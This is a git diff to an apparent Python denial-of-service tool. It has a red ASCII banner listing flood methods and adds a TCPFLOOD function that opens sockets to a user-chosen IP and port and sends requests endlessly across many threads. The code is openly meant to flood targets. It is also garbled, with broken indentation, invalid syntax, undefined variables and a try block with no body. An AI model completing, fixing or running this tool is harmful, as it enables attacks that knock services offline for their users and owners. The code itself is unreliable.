@@ -18,10 +18,6 @@ logo = """
 \037[91m╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝
 """
 
-
-
-
-
 banner = """
 \033[91m█▀▄▀█ █▀▀ ▀█▀ █░█ █▀█ █▀▄ ▀
 \033[91m█░▀░█ ██▄ ░█░ █▀█ █▄█ █▄▀ ▄
@@ -31,12 +27,13 @@ banner = """
 \033[91m|   UDP    |17091| 7777 |
 \033[91m| UDPBOMB  |17091| 7777 |
 \033[91m] TCPBOMB  | 80  | 3389 |
+\033[91m] TCPFLOOD | 80  | 3389 |
 \033[91m|----------|------------|
 """
 
 print(logo)
 print(banner)
-method = str(input("Method (TCP, TCPBOMB, UDP, SYN, UDPBOMB) : "))
+method = str(input("Method (TCP, TCPBOMB, TCPFLOOD, UDP, SYN, UDPBOMB) : "))
 
 def UDP():
     ip = str(input("IP : "))
@@ -72,13 +69,7 @@ def TCP():
 
         s.sendto(data, addr)
         
- def TCPBOMBA():
- 
- def randproxy():
-     ip = ".".join(map(str, (random.randint(o,255)for _ in range(4)))
-  def randport():
-      port = random.randint(1000.9000)
-      return port
+ def TCPBOMB():
       
      ip = str(input("IP : ")))
      port = int(input("PORT : "))
@@ -113,7 +104,6 @@ port = int(input("port address > "))
 times = int(input("times ? > "))
 threads = int(input("how many threads you want ? > "))
 
-def ddos():
      while True:
           o = ["!", "+", "=", "-", "/"]
           i = random.choice(o)
@@ -159,21 +149,53 @@ def attack():
 for _ in range(100):
     t = threading.Thread(target=attack)
     t.start()
+    
+ def TCPFLOOD():
+ 
+  print("""
+  mamah,akuh tkut
+  """)
+  
+  ip = str(input("IP : "))
+  port = int(input("PORT : "))
+  time = int(input("TIME : "))
+  
+  while True:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((str(ip),int (port)))
+    s.send(str.encode(main_req))
+    try:
+    for i in range(pack):
+        s.send(str.encode(main_req))
+    xx += random.randint(0, int(pack))
+    print(print(f"[{i}]" + "TCP-FLOOD METHOD LAUNCHED TO >" format.ip))
+             except :
+               print(print(f"{i}" + "TCP-FLOOD DIDN'T SENDING PACKETS DUE TO WRONG INPUT >" format.ip))
+       
+            s.close()
+            print("""Mamah,aku tkut""")
+            
+for x in range (thread):    
+     thred = threading.Thread(target=start)
+     thread.start()
+  
  
 if __name__ == '__main__':
 	print(logo)
 	print(banner)
 	try:
-          if method == 'TCP':
+		if method == 'TCP':
 			TCP()
+		elif method == 'TCPFLOOD':
+		  TCPFLOOD()
+		elif method == 'TCPBOMB':
+		  TCPBOMB
 	  elif method == 'SYN':
-	        SYN()
-	  elif method == 'UDP':
-		UDP()
-	  elif method == 'UDPBOMB':
-              UDPBOMB()
-          elif method === 'TCPBOMB':
-	      TCPBOMB()
+	    SYN()
+		elif method == 'UDP':
+			UDP()
+		elif method == 'UDPBOMB':
+		  UDPBOMB()
 		  
 		else:
 			print("Unknow method: %s" % method)
